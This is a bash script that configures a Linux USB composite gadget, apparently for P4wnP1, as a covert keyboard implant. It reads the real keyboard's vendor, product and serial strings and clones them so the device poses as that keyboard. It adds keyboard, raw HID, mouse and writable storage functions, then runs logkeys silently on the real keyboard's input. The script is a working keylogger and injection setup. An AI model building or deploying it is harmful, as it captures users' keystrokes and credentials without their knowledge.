#!/bin/bash

sleep 5

modprobe libcomposite
modprobe dwc2

GADGETS_DIR="mygadget"

# FOR USB MASS STORAGE NEED TO CREATE AN IMG
# dd if=/dev/zero of=image.bin bs=1M count=128
# mkdosfs image.bin
# MAY NEED TO apt-get install dosfstools

#Determine current keyboard and gather its information
input_device=`grep -E 'Handlers|EV=' /proc/bus/input/devices | grep -B1 'EV=1[02]001[3Ff]' | grep -Eo 'event[0-9]+'`
dev_vendor_id=`grep -E 'Vendor=|EV=' /proc/bus/input/devices | grep -B1 'EV=1[02]001[3Ff]' | grep -Po 'Vendor=\K[0-9a-f]+'`
dev_prod_id=`grep -E 'Product=|EV=' /proc/bus/input/devices | grep -B1 'EV=1[02]001[3Ff]' | grep -Po 'Product=\K[0-9a-f]+'`
dev_manuf_str=`lsusb -v -d $dev_vendor_id:$dev_prod_id | grep -E 'iManufacturer' | grep -Po '[0-9] \K[\w ]+'`
dev_prod_str=`lsusb -v -d $dev_vendor_id:$dev_prod_id | grep -E 'iProduct' | grep -Po '[0-9] \K[\w ]+'`
dev_serial_str=`lsusb -v -d $dev_vendor_id:$dev_prod_id | grep -E 'iSerial' | grep -Po 'iSerial[\s]*\K[\w ]+'`
#Check if gadget was previously created, if so REMOVE it
#Can probably optimize this when using diff profiles
if [ -d /sys/kernel/config/usb_gadget/$GADGETS_DIR ]; then
	cd /sys/kernel/config/usb_gadget
	echo "" > $GADGETS_DIR/UDC
	rm $GADGETS_DIR/configs/c.1/mass_storage.usb0
	rm $GADGETS_DIR/configs/c.1/hid.usb0
	rm $GADGETS_DIR/configs/c.1/hid.usb1
	rm $GADGETS_DIR/configs/c.1/hid.usb2
	rmdir $GADGETS_DIR/configs/c.1/strings/0x409
	rmdir $GADGETS_DIR/configs/c.1
	rmdir $GADGETS_DIR/functions/mass_storage.usb0
	rmdir $GADGETS_DIR/functions/hid.usb0
	rmdir $GADGETS_DIR/functions/hid.usb1
	rmdir $GADGETS_DIR/functions/hid.usb2
	rmdir $GADGETS_DIR/strings/0x409
	rmdir $GADGETS_DIR
fi

#Create gadget
cd /sys/kernel/config/usb_gadget
mkdir -p $GADGETS_DIR
cd $GADGETS_DIR

#Basic info
echo 0x0100 > bcdDevice # Version 1.0.0
echo 0x0300 > bcdUSB # USB 2.0
#echo 0x0200 > bcdUSB # USB 2.0
echo 0xEF > bDeviceClass
echo 0x01 > bDeviceProtocol
echo 0x02 > bDeviceSubClass
#Commenting this out to see if speed improves. 2-19-19
#echo 0x08 > bMaxPacketSize0
#works
#echo 0x0104 > idProduct # Multifunction Composite Gadget
#echo 0x0105 > idProduct # Multifunction Composite Gadget
#works
#echo 0x1d6b > idVendor # Linux Foundation
#These were defaults - 02/18/19
#echo 0x$dev_prod_id > idProduct # Keyboard TRACER Gamma Ivory
#echo 0x$dev_vendor_id > idVendor # SiGma Micro

echo 0x0436 > idProduct # Keyboard TRACER Gamma Ivory
echo 0x1D6B > idVendor # SiGma Micro

#English locale
mkdir strings/0x409

#echo "My manufacturer" > strings/0x409/manufacturer
#echo "My virtual keyboard" > strings/0x409/product
echo $dev_manuf_str > strings/0x409/manufacturer
echo $dev_prod_str > strings/0x409/product
echo $dev_serial_str > strings/0x409/serialnumber

# Create HID function
mkdir functions/hid.usb0

#Keyboard
echo 1 > functions/hid.usb0/protocol
echo 8 > functions/hid.usb0/report_length # 8-byte reports
echo 1 > functions/hid.usb0/subclass
echo -ne \\x05\\x01\\x09\\x06\\xa1\\x01\\x05\\x07\\x19\\xe0\\x29\\xe7\\x15\\x00\\x25\\x01\\x75\\x01\\x95\\x08\\x81\\x02\\x95\\x01\\x75\\x08\\x81\\x03\\x95\\x05\\x75\\x01\\x05\\x08\\x19\\x01\\x29\\x05\\x91\\x02\\x95\\x01\\x75\\x03\\x91\\x03\\x95\\x06\\x75\\x08\\x15\\x00\\x25\\x65\\x05\\x07\\x19\\x00\\x29\\x65\\x81\\x00\\xc0 > functions/hid.usb0/report_desc

#RAWHID
mkdir functions/hid.usb1
echo 1 > functions/hid.usb1/protocol
echo 1 > functions/hid.usb1/subclass
echo 64 > functions/hid.usb1/report_length
echo -ne \\x06\\x00\\xff\\x09\\x01\\xa1\\x01\\x09\\x01\\x15\\x00\\x26\\xff\\x00\\x75\\x08\\x95\\x40\\x81\\x02\\x09\\x02\\x15\\x00\\x26\\xff\\x00\\x75\\x08\\x95\\x40\\x91\\x02\\xc0 > functions/hid.usb1/report_desc

#HID Mouse
mkdir functions/hid.usb2
echo 2 > functions/hid.usb2/protocol
echo 1 > functions/hid.usb2/subclass
echo 6 > functions/hid.usb2/report_length
echo -ne \\x05\\x01\\x09\\x02\\xa1\\x01\\x09\\x01\\xa1\\x00\\x85\\x01\\x05\\x09\\x19\\x01\\x29\\x03\\x15\\x00\\x25\\x01\\x95\\x03\\x75\\x01\\x81\\x02\\x95\\x01\\x75\\x05\\x81\\x03\\x05\\x01\\x09\\x30\\x09\\x31\\x15\\x81\\x25\\x7f\\x75\\x08\\x95\\x02\\x81\\x06\\x95\\x02\\x75\\x08\\x81\\x01\\xc0\\xc0\\x05\\x01\\x09\\x02\\xa1\\x01\\x09\\x01\\xa1\\x00\\x85\\x02\\x05\\x09\\x19\\x01\\x29\\x03\\x15\\x00\\x25\\x01\\x95\\x03\\x75\\x01\\x81\\x02\\x95\\x01\\x75\\x05\\x81\\x01\\x05\\x01\\x09\\x30\\x09\\x31\\x15\\x00\\x26\\xff\\x7f\\x95\\x02\\x75\\x10\\x81\\x02\\xc0\\xc0 > functions/hid.usb2/report_desc

#USB Mass Storage
mkdir -p functions/mass_storage.usb0
echo 1 > functions/mass_storage.usb0/stall # allow bulk EPs
echo 0 > functions/mass_storage.usb0/lun.0/cdrom # don't emulate CD-ROm
echo 0 > functions/mass_storage.usb0/lun.0/ro # write acces
# enable Force Unit Access (FUA) to make Windows write synchronously
# this is slow, but unplugging the stick without unmounting works
echo 0 > functions/mass_storage.usb0/lun.0/nofua 
echo /root/USB_STORAGE/image.bin > functions/mass_storage.usb0/lun.0/file

# Create configuration
mkdir -p configs/c.1/strings/0x409

echo 0x80 > configs/c.1/bmAttributes
echo 200 > configs/c.1/MaxPower # 200 mA
echo "Example configuration" > configs/c.1/strings/0x409/configuration

# Link HID function to configuration
ln -s functions/hid.usb0 configs/c.1
ln -s functions/hid.usb1 configs/c.1
ln -s functions/hid.usb2 configs/c.1
ln -s functions/mass_storage.usb0 configs/c.1

# Enable gadget
ls /sys/class/udc > UDC

#cd /dev/input/by-path
#KBINPUT=`ls *-event-kbd`

#Temporary config for P4wnpi
PATH_HID_KEYBOARD="/sys/kernel/config/usb_gadget/$GADGETS_DIR/functions/hid.usb0/dev"
PATH_HID_RAW="/sys/kernel/config/usb_gadget/$GADGETS_DIR/functions/hid.usb1/dev"
PATH_HID_MOUSE="/sys/kernel/config/usb_gadget/$GADGETS_DIR/functions/hid.usb2/dev"
udevadm info -rq name  /sys/dev/char/$(cat $PATH_HID_KEYBOARD) > /tmp/device_hid_keyboard
udevadm info -rq name  /sys/dev/char/$(cat $PATH_HID_RAW) > /tmp/device_hid_raw
udevadm info -rq name  /sys/dev/char/$(cat $PATH_HID_MOUSE) > /tmp/device_hid_mouse

cd /root/logkeys/build/src
#setleds -caps +caps
/root/miykeys/build/src/logkeys -s -d /dev/input/$input_device -m /root/miykeys/keymaps/en_miykeys.map
